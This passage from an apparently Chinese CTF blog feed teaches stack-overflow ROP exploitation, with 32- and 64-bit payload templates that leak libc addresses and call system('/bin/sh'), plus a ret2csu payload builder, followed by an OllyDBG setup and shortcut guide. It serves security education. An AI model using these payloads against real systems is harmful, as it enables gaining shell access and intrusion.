class="language-python"><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>obj <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">"read"</span><span class="token punctuation">,</span> read_real_addr<span class="token punctuation">)</span>   <span class="token comment"># 第二个参数为已泄露的实际地址，或最后12位（比如：d90），int类型</span>libcbase <span class="token operator">=</span> read_real_addr <span class="token operator">-</span> obj<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'read'</span><span class="token punctuation">)</span>  <span class="token comment"># 计算基地址</span>system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> obj<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>  <span class="token comment"># 计算程序中 system() 的真实地址</span>bin_sh_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> obj<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span>  <span class="token comment"># 计算程序中'/bin/sh'的真实地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果不使用 LibcSearcher，则需要先确定 libc 版本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"libc路径"</span><span class="token punctuation">)</span>libcbase <span class="token operator">=</span> read_real_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span>  <span class="token comment"># 计算基地址</span>system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>  <span class="token comment"># 计算程序中 system() 的真实地址</span>bin_sh_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 计算程序中'/bin/sh'的真实地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="4"><li>构造如下 payload 实现 <code>system(&quot;/bin/sh&quot;)</code>：</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">0x4</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'aaaa'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h2 id="64-位-ROP-构造-2"><a href="#64-位-ROP-构造-2" class="headerlink" title="64 位 ROP 构造"></a>64 位 ROP 构造</h2><blockquote><p>假设栈开辟的空间为 20 字节，rbp 的大小为 8 字节</p></blockquote><ol><li>首先需要泄露出一个函数的真实地址<br>这里以利用 <code>puts()</code> 函数来泄露 <code>read()</code> 函数的 got 表地址为例（泄露其他函数也是可以的），最后再次返回到 <code>main()</code> 函数</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>接收 <code>put()</code> 函数打印出的 <code>read@got</code> 的地址，由于 <code>puts()</code> 函数返回的值里面会追加一个 ‘\n’，通过 replace() 手动去掉，<code>ljust()</code> 用于补全位数为八位</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">read_real_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>根据泄露的地址获得程序对应的 libc 版本，第二个参数一般为已泄露的实际地址</li></ol><p><strong>如果已知 libc 可直接使用，如果未知则使用 LibcSearcher</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>obj <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">"read"</span><span class="token punctuation">,</span> read_real_addr<span class="token punctuation">)</span>   <span class="token comment"># 第二个参数为已泄露的实际地址，或最后12位（比如：d90），int类型</span>libcbase <span class="token operator">=</span> read_real_addr <span class="token operator">-</span> obj<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'read'</span><span class="token punctuation">)</span>  <span class="token comment"># 计算基地址</span>system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> obj<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>  <span class="token comment"># 计算程序中 system() 的真实地址</span>bin_sh_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> obj<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span>  <span class="token comment"># 计算程序中'/bin/sh'的真实地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果不使用 LibcSearcher，则需要先确定 libc 版本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"libc路径"</span><span class="token punctuation">)</span>libcbase <span class="token operator">=</span> read_real_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span>  <span class="token comment"># 计算基地址</span>system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>  <span class="token comment"># 计算程序中 system() 的真实地址</span>bin_sh_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 计算程序中'/bin/sh'的真实地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="4"><li>构造如下 payload 实现 <code>system(&quot;/bin/sh&quot;)</code>：</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>利用 <code>write()</code> 泄露示例：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span>  payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdx_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token comment"># 第三个参数，放在 RDX  </span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># 第二个参数，放在 RSI  </span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">)</span> <span class="token comment"># 第一个参数，放在 RDI  </span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># 执行 write()  </span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span> <span class="token comment"># 返回到 main()</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>前提是要找到刚好有</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">pop rdi <span class="token punctuation">;</span> ret  pop rsi <span class="token punctuation">;</span> ret  pop rdx <span class="token punctuation">;</span> ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这三种 gadget 属于理想状况，需要根据实际 gadget 进行调整；<strong>但通常来说，是没有 <code>pop rdx ; ret</code> 这个 gadget 的，要更改 <code>rdx</code> 可以借助 Ret2csu 的方法</strong></p></blockquote><hr><h1 id="Ret2csu"><a href="#Ret2csu" class="headerlink" title="Ret2csu"></a>Ret2csu</h1><blockquote><p>Ret2csu（return to libc_csu_init），利用 <code>libc_csu_init</code> 中的两个代码片段来实现 <code>rdi</code>、<code>rsi</code>、<code>rdx</code> 这 3 个参数的传递</p><p>适用于 64 位程序中无法凑齐 <code>pop rdi ; ret</code>、<code>pop rsi ; ret</code>、<code>pop rdx ; ret</code> 等类似于 <code>rdi</code>、<code>rsi</code>、<code>rdx</code> 这 3 个传参的 gadget（或找不到），此时就可以考虑使用 <code>libc_csu_init</code> 函数的通用 gatgets</p></blockquote><h2 id="libc-csu-init"><a href="#libc-csu-init" class="headerlink" title="libc_csu_init"></a>libc_csu_init</h2><blockquote><p><code>libc_csu_init</code> 是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数（动态链接），一旦调用 libc 里面的函数就必须经过 libc 初始化的步骤，所以这个函数一定会存在</p><p><code>csu</code> 即：<code>C Start Up</code></p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E10.png" alt="栈溢出漏洞10.png"></p><p>我们一般需要利用 <code>libc_csu_init</code> 中的两段代码： <strong>（寄存器顺序可能会有所不同，以实际为准）</strong></p><ol><li><code>gadget2</code> <strong>（后调用）</strong></li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000004011</span>C8 <span class="token number">4</span>C <span class="token number">89</span> FA                      mov     rdx<span class="token punctuation">,</span> r15<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000004011</span>CB <span class="token number">4</span>C <span class="token number">89</span> F6                      mov     rsi<span class="token punctuation">,</span> r14<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000004011</span>CE <span class="token number">44</span> <span class="token number">89</span> EF                      mov     edi<span class="token punctuation">,</span> r13d<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000004011</span>D1 <span class="token number">41</span> FF <span class="token number">14</span> DC                   call    ds<span class="token operator">:</span><span class="token punctuation">(</span>__frame_dummy_init_array_entry <span class="token operator">-</span> <span class="token number">403E10</span>h<span class="token punctuation">)</span><span class="token punctuation">[</span>r12<span class="token operator">+</span>rbx<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000004011</span>D1<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000004011</span>D5 <span class="token number">48</span> <span class="token number">83</span> C3 <span class="token number">01</span>                   add     rbx<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000004011</span>D9 <span class="token number">48</span> <span class="token number">39</span> DD                      cmp     rbp<span class="token punctuation">,</span> rbx<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000004011</span>DC <span class="token number">75</span> EA                         jnz     <span class="token keyword">short</span> loc_4011C8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li><code>gadget1</code> <strong>（先调用）</strong></li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000004011</span>DE <span class="token number">48</span> <span class="token number">83</span> C4 <span class="token number">08</span>                   add     rsp<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000004011E2</span> <span class="token number">5</span>B                            pop     rbx<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000004011E3</span> <span class="token number">5</span>D                            pop     rbp<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000004011E4</span> <span class="token number">41</span> <span class="token number">5</span>C                         pop     r12<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000004011E6</span> <span class="token number">41</span> <span class="token number">5</span>D                         pop     r13<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000004011E8</span> <span class="token number">41</span> <span class="token number">5</span>E                         pop     r14<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000004011</span>EA <span class="token number">41</span> <span class="token number">5F</span>                         pop     r15<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000004011</span>EC C3                            retn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="ROP-构造-1"><a href="#ROP-构造-1" class="headerlink" title="ROP 构造"></a>ROP 构造</h2><blockquote><p>一般来说，<code>Ret2csu</code> 只用于 64 位的 ROP 构造</p><p>假设栈开辟的空间为 20 字节，rbp 的大小为 8 字节</p></blockquote><ul><li>以调用 <code>write()</code> 函数泄露 <code>read()</code> 函数 got 地址为例：</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>gadget1_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>               <span class="token comment"># rbx，设置为 0</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>               <span class="token comment"># rbp，设置为 1</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>          <span class="token comment"># r12，设置为想要跳转的函数的 got 地址</span><span class="token comment"># 以下寄存器顺序可能会有所不同，注意结合 IDA 具体分析</span><span class="token comment"># 对应关系: r13 => edi, r14 => rsi, r15 => rdx</span><span class="token comment"># ----------------------------------------</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>               <span class="token comment"># r13，write()的第一个参数，1 表示输出到屏幕</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>               <span class="token comment"># r14，write()的第二个参数，要泄漏的函数地址</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>               <span class="token comment"># r15，write()的第三个参数，输出的长度</span><span class="token comment"># ----------------------------------------</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>gadget2_addr<span class="token punctuation">)</span>               <span class="token comment"># 执行gadget2_addr将r13/r14/r15传送到edi/rsi/rdx</span>payload <span class="token operator">+=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x38</span>               <span class="token comment"># 填充56字节垃圾数据</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>为方便多次构造，设计成 <code>csu()</code> 函数如下：</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">csu</span><span class="token punctuation">(</span>rbx<span class="token punctuation">,</span> rbp<span class="token punctuation">,</span> r12<span class="token punctuation">,</span> r13<span class="token punctuation">,</span> r14<span class="token punctuation">,</span> r15<span class="token punctuation">,</span> ret<span class="token punctuation">)</span><span class="token punctuation">:</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>gadget1_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rbx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rbp<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r12<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r13<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r14<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r15<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>gadget2_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x38</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><em>1. 问：为什么 payload 中 <code>p64(gadget1_addr)</code> 后面还要再加一个 <code>p64(0xdeadbeef)</code>？</em></p><p>其实这个与 <code>gadget1_addr</code> 地址的取值有关，注意 <code>gadget1</code> 的开头：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000004011</span>DE <span class="token number">48</span> <span class="token number">83</span> C4 <span class="token number">08</span> add rsp<span class="token punctuation">,</span> <span class="token number">8</span>  <span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000004011E2</span> <span class="token number">5</span>B pop rbx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这里的第一条指令 <code>add     rsp, 8</code> 我们并不需要，如果设置 <code>gadget1_addr = 0x4011DE</code>，因为这一句将 <code>rsp</code> 加了 8，我们就需要先填充 8 字节垃圾数据才能到达我们布置好的栈帧数据</p><p>相反，如果设置 <code>gadget1_addr = 0x4011E2</code>，就不会执行 <code>add     rsp, 8</code> 指令，因为没有修改 <code>rsp</code>，<code>p64(gadget1_addr)</code> 后面紧跟的就是我们布置好的栈帧数据，那么就不用加 <code>p64(0xdeadbeef)</code></p><hr><p><em>2. 问：为什么将 rbx 设置为 0 ？</em></p><p>在 <code>gadget2</code> 中执行 <code>call    ds:(__frame_dummy_init_array_entry - 403E10h)[r12+rbx*8]</code> 这个指令的时候</p><p>如果将 <code>rbx</code> 设置为 0，那么只需把 <code>r12</code> 的值设置成我们想要跳转的地址，这样就很方便，可以忽略 <code>rbx</code> 的干扰</p><hr><p><em>3. 问：为什么将 rbp 设置成 1 ？</em></p><p>在 <code>gadget2</code> 中执行以下几句指令的时候：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000004011</span>D5 <span class="token number">48</span> <span class="token number">83</span> C3 <span class="token number">01</span> add rbx<span class="token punctuation">,</span> <span class="token number">1</span>  <span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000004011</span>D9 <span class="token number">48</span> <span class="token number">39</span> DD cmp rbp<span class="token punctuation">,</span> rbx  <span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000004011</span>DC <span class="token number">75</span> EA jnz <span class="token keyword">short</span> loc_4011C8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>jnz</code> 是当 <code>rbp</code> 和 <code>rbx</code> 不相等时跳转，但我们并不想真的跳转到 <code>short loc_4011C8</code> 这个地方</p><p>因此当 <code>rbx</code> 增加 1 之后，我们要让 <code>rbp</code> 和 <code>rbx</code> 相等，因此 <code>rbp</code> 就要提前被设置成 1</p><hr><p><em>4. 问：为什么将 r12 设置成想要跳转的函数的 got 地址 ？</em></p><p>在 <code>gadget2</code> 中执行 <code>call    ds:(__frame_dummy_init_array_entry - 403E10h)[r12+rbx*8]</code> 这个指令的时候</p><p>由于前面设置 <code>rbx = 0</code>，所以相当于执行 <code>call qword ptr [r12]</code>，<strong>但因为 <code>gadget2</code> 中的代码为 <code>call</code> 指令，所以必须是 call 函数的 got 地址</strong></p><p>如果仅仅是修改参数，不想执行跳转，可以 call <code>_term_proc</code> 这个空函数）</p><hr><p><em>5. 问：r13、r14、r15 的值为什么这么设置 ?</em></p><p>在 <code>gadget2</code> 中会执行：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000004011</span>C8 <span class="token number">4</span>C <span class="token number">89</span> FA mov rdx<span class="token punctuation">,</span> r15  <span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000004011</span>CB <span class="token number">4</span>C <span class="token number">89</span> F6 mov rsi<span class="token punctuation">,</span> r14  <span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000004011</span>CE <span class="token number">44</span> <span class="token number">89</span> EF mov edi<span class="token punctuation">,</span> r13d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>所以 <code>r13</code>、<code>r14</code>、<code>r15</code> 这三个值分别对应了 <code>rdx</code>、<code>rsi</code>、<code>edi</code></p><p>要注意的是：<br><code>r15</code> 最后传给的是 <code>edi</code> 而不是 <code>rdi</code>（即 <code>rdi</code> 的低 32 位），所以最后 <code>rdi</code> 的高位四字节都是 0，而低位四字节才是 <code>r15</code> 里的内容</p><p>也就是说：<strong>如果想用 Ret2csu 的方法将 <code>rdi</code> 里存放成一个地址是不可行的</strong></p><hr><p><em>6. 问：为什么填充 56 字节的垃圾数据 ?</em></p><p>运行 <code>gadget1</code> 和 <code>gadget2</code> 这两段代码后，会将栈顶指针移动 56 字节，用 56 个字节数据填充来平衡堆栈造成的空缺，才可以连接到 <code>ret</code> 的位置进行跳转（共 7 个 <code>pop</code> 操作，每一个 <code>pop</code> 操作加 8）</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OllyDBG的基础和使用</title>
      <link href="/posts/d8e4388f.html"/>
      <url>/posts/d8e4388f.html</url>
      
        <content type="html"><![CDATA[<h1 id="OllyDBG-的下载安装"><a href="#OllyDBG-的下载安装" class="headerlink" title="OllyDBG 的下载安装"></a>OllyDBG 的下载安装</h1><blockquote><p>推荐使用从<a href="https://www.52pojie.cn/">吾爱破解论坛</a>下载的吾爱破解专用版OllyDBG，该版本具有强大的对抗反调试的功能</p></blockquote><ol><li>下载地址： <a href="http://down.52pojie.cn/Tools/Debuggers/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E4%B8%93%E7%94%A8%E7%89%88Ollydbg.rar">吾爱破解专用版OllyDBG</a></li><li>解压后复制到想放置的路径下，执行 <code>&quot;Udd Cleaner.exe&quot;</code> 、<code>&quot;路径修复工具.exe&quot;</code></li><li>以管理员权限运行 <code>&quot;吾爱破解[LCG].exe&quot;</code> 即可使用</li><li>注意：<mark>“OllyDBG.EXE” 是英文版本，”吾爱破解[LCG].exe” 为全汉化</mark></li></ol><hr><h1 id="OllyDBG-界面"><a href="#OllyDBG-界面" class="headerlink" title="OllyDBG 界面"></a>OllyDBG 界面</h1><blockquote><p>初始界面为：”LCG - 主线程，模块” 窗口</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/OllyDBG%E5%92%8CGDB_OllyDBG%E7%95%8C%E9%9D%A21.png" alt="OllyDBG和GDB_OllyDBG界面1.png"></p><ul><li><p><strong>反汇编窗口</strong><br>  载入程序后，窗口内显示的是程序反汇编后的源代码</p></li><li><p><strong>信息窗口</strong><br>  进行动态调试时，窗口内会显示出当前代码行的各个寄存器的信息，或者 API 函数的调用、跳转等信息，可以用来辅助了解当前代码行的寄存器的运行情况</p></li><li><p><strong>数据窗口</strong><br>  默认以十六进制的方式显示内存中的数据</p></li><li><p><strong>寄存器窗口</strong><br>  动态显示 CPU 各个寄存器的内容，包括数据寄存器、指针及变址寄存器、段寄存器，以及控制寄存器中的程序状态字寄存器</p></li><li><p><strong>堆栈窗口</strong><br>  显示堆栈的内容。调用 API 函数或子程序时，通过查看堆栈可以知道传递的参数等信息</p></li><li><p><strong>命令行</strong><br>  在原本的 OllyDBG 中是没有命令行的，这个是一个外置的插件，可以方便地在动态调试时输入命令。一般来说，主要是输入下断点或者清除断点的命令。“命令行命令.txt”文件中有详细的命令及功能介绍</p></li></ul><hr><h1 id="OllyDBG-设置"><a href="#OllyDBG-设置" class="headerlink" title="OllyDBG 设置"></a>OllyDBG 设置</h1><h2 id="字体设置"><a href="#字体设置" class="headerlink" title="字体设置"></a>字体设置</h2><blockquote><p>由于默认字体过于难受，可进行如下配置</p></blockquote><ol><li>在界面选项里，将字体设置为 “系统等宽字体”，点击更改，选择好字体、字体大小</li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/OllyDBG%E5%92%8CGDB_OllyDBG%E7%95%8C%E9%9D%A22.png" alt="OllyDBG和GDB_OllyDBG界面2.png"></p><ol start="2"><li>在初始窗口中，右键 -&gt; 界面选项 -&gt; 全局字体 -&gt; 系统等宽字体</li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/OllyDBG%E5%92%8CGDB_OllyDBG%E7%95%8C%E9%9D%A23.png" alt="OllyDBG和GDB_OllyDBG界面3.png"></p><hr><h1 id="OllyDBG-的常用快捷键"><a href="#OllyDBG-的常用快捷键" class="headerlink" title="OllyDBG 的常用快捷键"></a>OllyDBG 的常用快捷键</h1><table><thead><tr><th align="left">快捷键</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left"><strong>Ctrl + F2</strong></td><td align="left">重新载入程序</td></tr><tr><td align="left"><strong>Alt + F2</strong>&amp;nbsp;</td><td align="left">关闭程序</td></tr><tr><td align="left"><strong>F2</strong></td><td align="left"><code>设置断点</code></td></tr><tr><td align="left"><strong>F4</strong></td><td align="left">执行到光标所在的位置</td></tr><tr><td align="left"><strong>F7</strong></td><td align="left"><code>单步步入（会进入子函数，并停在子函数的第一条命令上）</code></td></tr><tr><td align="left"><strong>F8</strong></td><td align="left"><code>单步步过（会一次运行完子函数）</code></td></tr><tr><td align="left"><strong>F9</strong></td><td align="left">运行程序，遇到断点则停在断点位置</td></tr><tr><td align="left"><strong>F12</strong></td><td align="left">暂停执行程序</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
            <tag> OllyDBG </tag>
            
